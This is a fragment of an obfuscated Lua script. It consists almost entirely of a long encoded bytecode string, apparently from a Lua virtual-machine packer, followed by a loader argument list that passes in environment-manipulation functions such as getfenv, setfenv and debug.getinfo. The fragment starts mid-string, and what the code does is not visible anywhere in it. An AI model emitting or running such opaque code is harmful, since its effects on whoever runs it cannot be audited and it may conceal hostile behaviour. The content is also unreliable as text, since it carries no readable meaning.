726Y3O9W3D3M3OKA3O9Z3NZK36A73O9V3NZN3OUH3NZP3A233NZR3NZM3P3F3NBT3NOE3NZX3M6R3NOC3P3M3OKS3OV93OUX3LUY3NOJ3NOE3MIH3OV23LT43NOP3OL23NCG3LT126Z21J3M773OAX3M7J3OAZ3N0A3OLC35183OLE3OVJ26Z3P483MM83OLI3OVO3M7Y3OBB3P4E3NPG3O1I3ND73OVX3NPL3OBJ3NPO3NDF3OW33O1F340Y3O1H3NDE21I3OLX3NPY3M8Q3NQ03A233NQ23OLX3P543NQ63OM93NDX3OMB356S3OWI3NDU3P5A3N1T3OMH3LV63OCB3OWP3NQJ3MP83OWS3NEF3LVG3OMQ3N283LFG26Z37843O283OX13NEQ3OX3356S3NQZ3NQT3P5W3OX73OCU3LW23OCW3ON43O2R3P643O2T3O363ONA3LGC3O2Y3MWY3OXK3LWU3OXM3LGM3ODC3K1B3ODE3ODM3ONO3LX03NRV3MGP3OXZ3N3S31IH3NG03ONX3O3K3CSI3MB83NS53OY73O3Q3LHN3O473OYB3N4I3OOA3LXV3O3Y33GT3OE73OEK3OYK3OOJ340Y3NSS3O413MIH3OYP3MCP3O4A3LYF3O4D34NK3OOZ3O4H3OYZ3OEQ3LIW3O523O4O3C8N3OP33OZ63O4T34WD3O4W3NTO3OPB3OF33O513MP83OF63OF83OEP3O573OFB3NU13D543OZM3NUI3OZO3OPR340Y3O5G3NU33NIC3OZT3M013OZV3N6D3LKI3GY93OQ93O5T3M0B3O5V3N6M3LKU3O8M3OQB3LL93OQD3O623OQF2193P0C3NJD3OQK3O683OGC3NV33MMS3P0I3P0K3EKX3OGJ3P0N3NVA34XE3P0R3N7H3O6K3OGQ3A233NVJ3NVD3MIH3P0X3OR33NV13P10340Y3OR73OGO36NU3OH13O6W3M1Z3O6Y3OH53O703MUQ3P1A3M293OHC3O773OHE3ACU3NKI3NWG3P1J3MV63NKN3MP83NWO26Y3NKR35VK3ORV3O7K3NWT34UF3NKY3OHX3NWY3OS2340Y3O7T3NKY3MWY3OS63OIB3P1Z3OI83P2134IU3MHX3O833P263N9E3OIG3MGP3OSO3O8B3NXQ3OIL3NXS2133NXU3OIR3OSX3M493O8L3MMS3OIY26Y3OJ031IH3OJ23P2S3O8S3AEU3NYB3O8V3LPX3O8X3OJB3O8Z3MIH3P3226Y3NMQ31IH3NMS3P363O963K9Q3O993P3G3P3C3MJR3O9E3ME33OTT3OTV3GFJ3O9J3OTY3NZ6332W3P3N3OK03MKA3OK2340Y3OK43P3N3MP83P3T3P3V3O9Y340Y3OA03NNQ35TB3OA43ML03P433OA73OUK3MWY3OUM3OUO36HN3NZY3OUR3NOC37NU3MZB3NOF3P4H3MLG3OUZ3LMT3OKZ3LSU3P4O3OAS3OV73O0H33VG3OAW3LT63O0M3P4X3NCP3LTD3FDT3P51394F31923MGP3OVM2T13P573MME3OBB1O3O143P5C3OBG3LDP3OVY3LU33DVX3OLW3LU83OLY3MMY3OBQ3PEF3NPX3OM33P5R3OBX3P5T3OM63MMS3LUT3LV23NQ83OC43NQA3LV034ZY3PFI3P663M9A3P683NE83OWQ3PE83LVD3NQT3OWU3OCJ3P6H3PF93P6K3OCN3O2G3COO3O2I3M9Y3MIH3ON032GL3OX93MA63O2R1U3OD03P703OD23OXG3NFA3O2Y3PFU3P753N3H3P773MAQ3ODC3PG03LWU3ODF3P7D3NRU3ODJ3N3P3ODN3MBA3ONW340Y3ONY3NRX35493P7O3O3N3P7Q3ODX3P7S3PFU3P7U3NSE3GW33OYE340Y3NSI3OE03PGQ3P7V3OYJ3LY33OYL3OEB3OYN3MP83P8826Y3OYR31IH3OYT3OOR3NH41S3OYX3MCR3O4I3OEP3MCV3NTA3PFU3P8K3NTF31IH3NTH3OP53NHL3PHH3OF03MDK3P8S3MDF3NHS3MWY3P8W3OPK3NU03LJV3PF33OPO3P943LZR3OZP3N643LK726Z3KN93NUB3LKB3OFO3O5N3NUG3O5P1I3P9H3P003P9J3OFW3OQ73NUP1H3P043OGE3P063OQE3M0P26Z3PJ03O653OQJ3M0V3OQL3MTF3NV334EP3NV53OGH3O6D3PA4340Y3P0O3NJD1N3NVD3PA93M1F3O6L3N7K3P0V3PJE3NJV3OGV3O6Q3M1R3NK11M3P143MUI3NK63OH43A233NW23NK43LRG3OH83PAV3MGJ3PAX3P1D3NKG1L3OHG3PB23M2J3O7D3PB43ORQ34543OHO3NWW3P1O3MH73NWT34ZQ3PBF3P1T3PBH3P1V3NL33K283OI43NLE3PBP3MW13NXB3KT23PBT3P253NLG3P273A233OSK3NLE183P2A3NXU3PC03M3Z3NXS33ZB3P2H3NM63PC73MIN3O8L1E3P2O3NYI3P2Q3OT53NMB3KLN3PCJ3P2X3PCL3OTB340Y3NYH3NYB1C3P2X3NYL3M513OJH3PCV3NYP377X3MJM3P3B3M5B3O9C3OJP3O9E33L33P3G3OJU3P3I3PD7340Y3OTZ3P3G34YD3PDB3OA13P3P3MKC3O9S34Y03NNQ3OUA3M653OUC3NBH3LRQ3L3C3OUF3OA53PDS3OKH3OUK34KL3NZV3P4A3M6P3OAD3OKP3OAF35UD3PE33OKT3M6Z3OAK3NOI3OUZ143OV93PEA3OAR3M7B3O0H333J3NCK3PEH3OAY3OLA3O0O3P4Z3KIC3OVI3PEO27E2BL3P553NP93PET3N0N3OBB3KA73P5B3NDE3P5D3PF03P5F3PF23BI33NDE3OBM3LUA3OW43O1G3OBQ3PK03NPQ3P5Q3MN63P5S340Y3P5U3PF53PJL3O1L3P5Y378G3NDY3OMC3O1X2733PO83P653NQM3OMI3LV83OWQ2JA3M983NQN3PFX3NQQ3P6H3PLO3N243NQU3OCO3PG43OCQ3M9Y2RC3MO73P6T3MA43P6V340Y3ON53MO73POS3NF63OD13MAE3OD33PGI3OND31CD3NRJ3NFO3PGN3MP43ODC3PKE3N3H3PGS3O3A3OXU340Y3OXW3O383PQC3P7H3ONV3O3I3P7L3NS234MM3PH43ODU3LXJ3ODW3N443P7S26Q3PP83N483OE13OYD3P7X3LHZ26Z3PPK3OO93PHJ3MC73PHL3OOK3OYN31AY3OEE3NH63OEG3P8B3NH43PPE3NH03P8F3LYN3PI03MR43NTA3PRI3N513OZ43LYX3O4R3OEX3O4T3PR53O4P3OZA3MDD3OZC3OPD3NHS3PQX3NHU3OPJ3OZH3P8Z340Y3OFC3NHU26O3PQY3OFF3NU53O5E3P973NU92GK3PIU3OQ93OZU3PIX3OPY3O5P3LX43OQ23II23NUM3PJ4340Y3OQ83MSP3LX43P9O3N6S31IH3NIY3P083NUW3PS33NUY3P0D3P9W3P0F3M0Z26Z3PMU3PJM3NVD3PJO3OQS3LLT35LN3PA83O6J3PJW3PAB340Y3PAD3P0R3M1L3O6P3M1P3OGX3NK03LMF3EUP3N7W3P153PAQ3PKA340Y3PKC3MFX33MT3PQY3ORG3O7431IH3O763PKJ3OHE3PTB3O733OHH3PKO3OHJ340Y3OHL3N8C33453PKT3NKY3PKV3NWS3OHT3NWR3N8M3NWX3MHF3O7R3PBJ3OI13LUH3PBN3OS83NKL3O7Y3OSB3NXB3PT43N9A3PBU3PLD3PBW3M3R26Z3PNK3NLL3NXN3P2C3PC13OSR3NXS26S3PQY3OSV3NY13P2J3PC83NXZ3LUH3PCB3PCD3N9D3P2R340Y3P2T3NM63LUH3OJ63OJ83NYF3PM53OJC3PV33NMF3OTG3PMB3P35340Y3P373MXL3PKY3NMP3MXW3PD03MXZ3O9E2HD3PMN3O9N3PMP3OJW3M5P3NKE3NB43PMW3OK13OU53OK33O9S3LT33PDJ3OK93M673NZK3PW23P3U3P423M6F3OUI3NZQ3NO43PLA3P493PE33P4B3CT23OK833IM3LCW3ND43LCZ355S3NK731SE3OAP3I2X3LD72GW3P4P3OAT3P4R3LS43OVB3OVD3PEJ3OLB3PEL3HPO3PEN33LR3LBH3PQY3PER3O0W38FW3OVP340Y3O10341L2HF173PEX3POG3PEZ36EX3O0U2O23PO2315934RN33B033O23ABG26H3KDN319239WK31SE2HF26N331G2HF3LCB2BO2M53AYD2HF364K28K3P5M3OVU3OMQ3POT3PFB3POV3PFD36ZM2HF26R3PUJ333D3A9B3PUJ3DZ73IX83G1J2HF3LAW34IF2HF26T3PUJ34PB3PZM33QS3KWF3D4R33K23KWF3PZE3F9Z3PUJ39WF2HF330P29Z3CZY3GGT3KH93EUZ3GGY3BXA3PYO33BP2522MT34K93PZ93KVJ3PZK38UN3PZN38S23PUJ33Y53Q0D3I1933M52HF21M3PZV33393Q0P3IT131A623Z3Q0Q358Y3Q0J34HM3Q0L3L8E26H3O4F2M5336B3POY37X82IF3CXP3HEB3M8X3KWK3PXK36FV3JTI3AEU3A2C3NPT3LUF3CLN3PZ43NDU3OWA36Q32HF25C3PZB33YQ3Q1Q3PZQ395F2HF25D3Q0W27B3Q1X3Q1U330F32YU3PZ131SE2TY3LD2372N3LD43Q1A3Q1D3O1N33NI2M535YW3CNK3N1J26L2NE33KZ2M53JG534TA3A2C3IH43PUJ33393Q203PY634T02NE28P2M539AE3N1126K3D4V33AB2HF23T3Q0Y3FBJ3L8J27A3LZO2XW3JG53P6P33LH3MAF3LCG3Q1B36203Q1D3MOJ3ASG362K3P6G3LVK3Q1K3OX03PG23OMV3PPO34VR2RE24M3PUJ32KY33393Q3V35X12RE3Q3734VC32KY32ZM3PNR3Q3C37X83Q3E27A3NR327A3N2P392T3HF43AZX3Q3L3O2B3P6H3LGQ3OCM3MO73PG3369Y3FBJ3Q343KPA33393Q4Q33SR2RE37CZ2RE2403Q1Y27A3Q4Y33QS3Q4V27C32YU3OWX33LH3LFH33TY3NEN3Q4A3LVF3KWK3Q3S34ZG3MNM3Q2G3F503Q2I34ZL32KY36133EL5362K33V03Q3Z33YQ3Q5133YQ3Q4T34XG34PG28N26T34TO34ME3Q5W27A23U3Q5Y34TQ34PS3PQQ368V3PUJ34PX2HF25G3Q2Q335B3Q0S3Q2T3Q3033J83Q2X3Q1J3Q6H33063Q3232U53Q353Q413KYV33K932KY35SL3FBJ35SN3N1T26B2NE34SH3LET3L4Q3Q5637X834WV3LHD3LCD3Q2934YF3Q1D3NQX33RX2RE22W3Q3W33YQ3Q7E3Q52395F2RE22X3Q4Z36U73PUJ33IT3Q533PXC3Q7331SE3Q583Q3D3Q3G3NQV3Q5D37QQ3Q5G3NQT3Q5J358T3Q5L33SO3Q5O355323J3Q6D27B3Q7L3Q4033NE36IO32KY3Q3A33W93Q7Q39SH3Q6X3Q6Z3FBJ3EHV3L0P3PXE3G4O3Q763H1S3Q783Q7X3L6U3Q5E3Q7C26Z2283Q7F33393Q8Z3Q8C3LBQ3DNB3LC73Q8H3ENP3Q8K27B3Q703HKT3JLF3Q7S392T3Q8R3Q5A3Q792BO3Q7B33012RE21N3Q90335B3Q9N3Q7I3Q4W3OQG3Q7M21U3Q7O33K93Q8I3OA23L6U3Q8P3Q7U3Q483Q7W3Q5C3Q8V3Q7Z3LWV3Q5H320J3Q8236KU3Q8433TC3Q8635D83Q9233YQ3Q9V34PB3Q9Q33063Q6034TL27A21Y3Q6434MC3QAN34TS21W3QAR3Q662BL2CZ34MP34U02MT3QAZ3Q2T327T34UN3PYT3HK03Q0N26Z2103Q7M3QBB34Q62HF3Q6L3IRO2T13Q2Y3LU63Q6L33W02HF2113Q9W3FBJ3KF933ZB32KY33043LAK3FOH39WK39L839WK3Q2M3O973Q6V3FBK33M52RE2123Q7M3QC633QS34WV3Q223H1S3Q8P32FT3Q273ON83GBO3Q1D3NF934ZG320J34XX3Q5H32BV3QAB33KZ320J3Q4F34TA3PXK33V02163Q8927A2133PZE34YD3QC037US2MT21E3Q7O2Q63IX839WF3LBH36S839WK3A9X39WK3AGN3PZY397J3LAC3KYK33MH3HD837O336LC39NN3QD234VC2RE339P2653CEL3A1U3Q7T3KU1331G3NDW3Q273LEY3QDY3LUK3QE03EI53QE23COJ3QE431N03L0P3QE733TY3LFZ3QE63FHR3Q5738VN3QEE3Q1A27D3QCU3Q593QEH3QEK3OMQ3Q27320J3KYK3LCH33113Q4D27D3QCR3H3L3QER3OD43QDN3ONJ3Q1D38O13QEX3ESM3QEZ3PGI3QC028K3QEV3QF43H2A33YJ33ZB320J333T3EVA3QBW3PO83GGT351I3QBX3GGT3QDL3DWX3JTI3E1A3GGT391P3QDE3AA932FT3Q5M39MQ37TL39ZX3PYK3QD73A5U3PND3EIS3PVH38FW37XT3QG73KHF395F31A62633QG735D83QGE33QS3KHL3PXX33UP2NE33BB3KHI3DSO33KS319232CV3Q5H3Q2E3Q2J333A3QFP33L339YD37DN3QG73IJ13QGA3Q0A3B5D38FW32A73OLH35SQ331E3KW63HK03P553COC3QB63KHU35YF3O0X3G413B7B31923QH73OLP3QH935223QGR3I743N0S3CMS34UN2M5322U3H0W31923PY333IT2HF31BT332N3P1R2M53QDT27D3KWF3QHR34RW3QHM31SE2IF3QHO37CT35YW34UV3NPQ2643QGM2PH322U34VK31IH3Q2L3PYC3CDG25V3QIK2TY35YW36LC33X32IF3Q2M39WF2RE3A9T3DWX3QDJ3DWX3D4339WF32KY395O3LAC3QJ633ZB34WV365X3QDI34WJ3QFF3GTM32Z239WK362K3D4Q3L6L34L332FT3QBR362037873QJF32I1325U32FT32Z934ZF33M532FT24A3QGF33YQ3QK13IG033G434ZF3QIH2Q6352J328M34UN352J322U3LHP363U3KQT34UN3358322U356R3P7J3PGZ33IT334D3QJQ3QKD3QDB3EUY3GGT3HXI325U334D32Z9353X33M5334D24I3QK233393QL2339Y2IF3KJ735D824K3QGA33K9335839J5353E25S3QIK353E322U3CZ928K332L3QL838O133583DNS3DQ73PTA3NRE3IPH3AWL3QLB3G5339J5334D32BT34UN334D3G9P340Y352J3QCS3E0O3G53353X3QLR2B43H7U3K1T3N3H32YJ3ERF3GW338DQ3QJJ3QFK3GGY3QC0336T3LGP352I332R3Q0A33G425Y3D4R33ZB33G433333QBV3I793GGR3QMK3H7I3QF133MH3GTB3A65352J37BD3QMY3QC03Q083GGY3HRX26H3Q0A352J25W3QMU3GW33KBC3QN93GGT3QJ439WK3QN333AC37WF3A65353E33513QNL3GGY3QNN2BL3QLN3QNE3PQZ3QNH3G4W353E34VK2B43DNS3A1V3OEK32ET34UN354I322U3CYS39WF3LIX3QKS27A3KJG3QJM3KHU27D336T332L3CYS3PFU354I36V036143QOC27B3QOE33ZB3LYK33ZQ39WK3QOJ3FO93QJ43QON3O443QOQ3D4B3QIK3QOU3EQK3QMG3LYC3QOZ2BL3QP13QJ332Z33QP43QOP3OEK326C3QOB3KHU3QOW36F7320J3QPD3QOI3QNM3QPH3CYP3QPJ3MQO3HC53QPM3QOD3DWU33NU335O3QMJ3QPS3QNW3QPU3QOO3KJU3NGR375B3QPZ3QOV3QQ136203QPR3ODW3QN03QJN3EZG3QPV3QQ93OOG32833QP83QPN3QQE3HLC3DWX3QPF3QNB2BO3QPI3QQM3N4S25O3QQP3QQ03QPB3IUV3QQ43QQH3H7C3QN13QOM3QQL33NT3OEK3K2431TU3N4S3QR23A6533NU37S03QR53QQU3QR827C3QQX3QRB3MQO32DI3QQC3QPA3QRH39FV334J3QP03QPT35RA3QRA3PIL3N4S3KPR3QRS3O443QOF3G5H3QQG3QRL3QQJ38623QS03QP625C3QR13QQD3QR339C63QRK3QRY3QQW3QSC3OEK2XP3QS43QPO33NU354I3QS83QSK3QR93QQ83QRP3NSV25I3QSF3QRT3QS636YT3QQT3QSU3QRN3QSM3MQO25H3QT03QS53QOX3OEP3QST3QQ63QRZ3QSW3QS13NT23QTA3QSQ3IUG3QSJ3QTF3QSL3QTH3QP62BR3QSP3QQE35IU3QRW3QPE3QT53QQK3QTQ3OEK33Q83QTT3QR335NV3QTN3H7I3QP33QT73NSV37OA3QU33QRU33WW3QMY3QS93QOL3QR73GRP3QRO3QTI35543QUC3QS635VX3QUF3QTY3FO933RR3QUK3QP635FU3QRE3QP93QTB36F736H83QUQ3QTO3QQI35ZH3QUU3OEK2F23QUN3QTC3LBW3QV23QU73GGT3QUT3QU93NGR2593QTK3QQE331S378U3QRX3QV33QUI3QV53QVG3QQN2583QVJ3QR3366S3QVC3QV43QNX3QUJ3QVR3N4S24Z3QVU3QRU3HDI3QU63QVY3QQ73QP53OEK2FJ3QV936F736PF3QW73QVP3QU83QU03MQO2SB3QWD33NU35VI3QWG3QOK3QWI3QWA3MQO316C3QWM3H6E3QTE3QVD3QTG3QWS3NSV2P63QWV35UU3QWP3QP23QW93QPW3NSV3Q0A3QWV35JB3QWX3QW83QWZ3QX83NGR3CLL3QUX3QQQ3QR334513QXD3QWH3QX73QQY354I2503QW43QS63K093QX53QPG3QXF3QXQ3E2O3QXT3QTC3D1Z3QXN3QWQ3QXP3QSX3NGR33BB3QWV36ZV3FO93QUG3QWR3QXG3QQN24P3QY136F734M13QY43QX63QXY3QY73QQN3CUX3QWV35JE3QXW3QQV3QSV3QX03NGR24V3QYI33NU3D2O3QYL3QXX3QTP3QYW3QQN2FC3QWV33MA3QTW3QQ53QWY3QZ43QYF3N4S320D3QWV36RM3QT43QVO3QTZ3QZ53N4S33AL3QWV3KBY3QYT3QRM3QZL3QZE354I24J3QYZ36HN3QZ23QYU3QT63QWJ3NSV39DB3QWV3HB53QZR3QSA339Q3R023NGR3KCL3QWV33RL3R073QUH3QZT3QXZ24G3QZX35XM3QZA3QR63QY53QYN3QUL24N3QZX34KG3R0F3QYE3QXZ33QG3QXJ3QRG3QS63HLG3R0U3QY63QUL24L3QZX34J33R123R0P3QP624K3QZX368M3R183QZD3QXZ34423QWV37H33R1E3QYV3QZU3GUZ3QWV340X3R1K3R013QZM354I2AX3QWV35X63R1Q3R0H3QYO3N4S2NO3QWV347K3R0M3QYD3R133QP629G3QWV35WK3R1X3QSB3R0A3QQN27T3QWV370T3QYC3QUR3R093R1S29D3QZX385X3QVN3QZC3R1L3QXZ2893QWV3KDP3R243R2J3QV63MQO33643QOT3QXK3QRU2JC3QZZ3QZS3R2C3R2L35EX3QWV3KYO3R353R083R2Y3NSV2GT3QWV36JG3R2B3R2K3R1M2913QWV3KE43R2W3QZK3R373R1M2A43QWV37073R3J3R3E3NGR37CB3QWV32HU3R3C3R0G3R3R3QXZ32VW3QWV36SV3QZJ3R2Q3R1R3R1M2AA3QWV3KIW3R423R0V3R1Z354I2AT3QWV32Z63R4G3R263OEK23U3QZX37623R3P3R4A3R1Y3QUL28F3QWV375N3R4N3R193OEK28P3QWV35Z83R4T3QXE3R1F3R4I26Z27M3QWV3L2J3R503R583QUL23Y3QZX32BC3R5E3R2R3R5929Q3QWV35PY3R5K3R4B3QXZ2UI3QWV36A13R3W3QW1354I32IJ3QWV3L3N3R5Q3R4V3QP632LI3QWV36KS3R5W3R2D3N4S2EZ3QWV35YR3R563QXO3R513MQO23K3QZX32VP3R623R443R593KUJ3QWV35XT3R683R2L23Q3QZX35CN3R6L3R3K3QXZ23P3QZX36KJ3R6R3R1M329T3QWV34PA3R6E3R0O3R5F3QP6334U3QWV35IJ3R723QXZ2I13QWV3I5F3R773QYM3R793OEK23D3QZX383G3R6W3R3X3QQN31FT3QWV33QC3R7Q3R5X3K5A3QZX38JF3R7W3R69354I2OL3QWV3DNZ3R7E3R5923H3QZX36TY3R493R573R5L3QUL23G3QZX34MZ3R7J3QZ33R8E3QP62373QZX3L8V3R813R2L2YV3QWV336M3R8Q3R1M31EM3QWV33893R8V3QXZ2343QZX360P3R8J3R003R633OEK327A3QWV3NFN3R903R5923A3QZX372R3R2I3R3Q3R6X3R592EQ3QWV34U23R953R363R9J3QUL312P3QWV36TH3R873QUL22Z3QZX32KA35NB3R2P3R8D3QVP38KU3FOM3R6G3NSV22Y3QZX36T628X3RA13R6F3H7I3RA43E1G3R4O3MQO22X3QZX360E3RAB3QTX3R9I39WK3RAF3QW03R82361X3QZX3NK33RA03RAN3R4U3FO93RAQ3QVQ3RAS2333QZX35NJ3RAM3QZB3RA23QOK3RB03QVF3RAS2323QZX3NLD3RAW3RB73RAD3QV43RBA3RAH3NSV2313QZX37DL3Q013RAX3RBJ3QVE3QFO3R2X3R7X317F3QWV3ERS3RBQ3RBH3RB93RBT3GGY3QFP3R963R6M3QUL31243QWV3NN53A5F3RAC3RC23GGY33RR39WK3RC53R9P3R7R3N4S3KY03QWV373133653RCD3RAZ3RC33H7I3RCI3R3D3R7X3KXO3QWV315J3RCC3RBR3RA33RCS3QV43RCU3R433R9Q3QP62V73QWV3NP73RD03RC13RCR3RCF3RBU3R9I3RCK354I312F3QWV3DWR3R9V3QP631F53QWV3NQL3R9C3QUL31U33QWV36V53R9H3RAY3RD73OEK2ID3QWV32WC3RDS3QP62HI3QWV3AIS3RDN3OEK33EV3QWV3NSL3RE43OEK22H3QZX3NTC3REE3MQO31UO3QWV3KI43RE93MQO22N3QZX3IIF3R9O3RCV3RAS311J3QWV3NVC3REJ3NSV311T3QWV3NVM3REZ3NGR32CG3QWV36CF3REO3NSV31573QWV3NWV3QVM3RD13QOK3CNO3R7K3R8L3OEK3L103QWV36U83RDX3QV43RFH3R8K3R5R3R592293QZX361Y3QVX3QVP3RFQ3RC63RDZ3MQO2283QZX3KGP3RFX3RFG3RBV3RAS22F3QZX36193RG63FO93RFZ3RCJ3R7X22E3QZX3KIJ3RGD3DWX3RGF3REU3R2L22D3QZX39MM333X3RCQ3RGM3RG83R2L22C3QZX3O133RFE3RDD3RGV3RDH3R7X2233QZX35SG3RH13R0N3RGE3RGW3R1M32943QWV3LAR3RH93QUG3RGN3RD63RDI3OI23QZX33ZF3RHH3GGT3RHJ3R4H3QUL2203QZX22V378H3RGU39WK3RHR3RBL3NGR2273QZX338E3RHP3GGY3RI03RA63NGR2NW3QWV3O4F3RI63H7I3RI83R7L3MQO2253QZX34SQ3RGL3RHZ3RHC3QXZ324Y3QWV3O5A3RIE3RFP3RIO3R5921V3QZX33VP3RIT3RFY3RIV3QUL313J3QWV36M23RJ03RG73RH43RAS3KZS3QWV3B1X3RHY3RGG3RAS21S3QZX3O6U3RF43QQN3KZC3QWV34TU3RJK3N4S21Y3QZX34RZ3RF93NGR31P73QWV3O813RJP354I315V3QWV34Q53RET3RHK3QU934VC354I22A3QMQ3N4S2FO36OM354I3QIB3OP13QIE334D354I3CYS3LN53BUV21M3QIK3569322U3CQC3PI63PRM330F3H3932Z327M3KJY32I13DW632Z33DOT2BO3KKD32Z33KKH338V3ITA21L331G347O32273CZU39WF36GH325U3A993RDE3H7I3E0N39WK3CQG3QV43AI93RG039WK3RKY3FO93RL03QOK3RL238GR347O37Y02B43KKM3NJ126Z21K3QNI332J3O9M3B9I3RLP334V3GGT3RLK2BL3RM03FO93QO73QVP3QMM3FJT3D0D35LM347M',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
